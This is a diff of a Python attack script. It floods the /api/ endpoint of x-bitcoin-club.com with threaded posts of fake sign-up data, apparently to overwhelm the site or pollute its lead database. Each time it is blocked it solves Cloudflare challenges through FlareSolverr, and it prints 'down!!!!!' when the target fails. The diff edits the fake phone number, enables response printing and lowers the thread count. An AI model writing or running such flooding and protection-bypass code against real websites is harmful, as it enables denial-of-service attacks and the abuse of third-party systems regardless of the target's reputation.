@@ -92,7 +92,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			url = baseUrl + '/api/'
 			# url = baseUrl + '/author/jimmyaki/page/' + str(random.randint(1,100))
 
-			data = {'first_name':"assdasfdgsdfgsdfgd",'last_name':"asdfgsdfgsdfgsdfgsd",'email':"ads@asd.com",'area_code':"+31",'phone':"123123123",'funnel':"v1-x-bitcoin-club-com",'_ip':"123.123.171.124"}
+			data = {'first_name':"assdasfdgsdfgsdfgd",'last_name':"asdfgsdfgsdfgsdfgsd",'email':"ads@asd.com",'area_code':"+31",'phone':"0629299865",'funnel':"v1-x-bitcoin-club-com",'_ip':"123.123.171.124"}
 
 			headers={'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
@@ -118,7 +118,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			else:
 				print('down!!!!!')
 			# print('threadNum: ' + str(threadNumber))
-			# print(res[0].content)
+			print(res)
 			if str(res[0].status_code) in ['503', '403', '429']:
 				print('resolsing chalennge')
 				cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
@@ -136,7 +136,7 @@ def attackAll():
 
 flareSolverUrl = 'http://localhost:8191/v1'
 
-for i in range(10):
+for i in range(1):
 	Thread(target=attackUrlCF, args=['https://x-bitcoin-club.com', i]).start()
 	time.sleep(30)
 input()
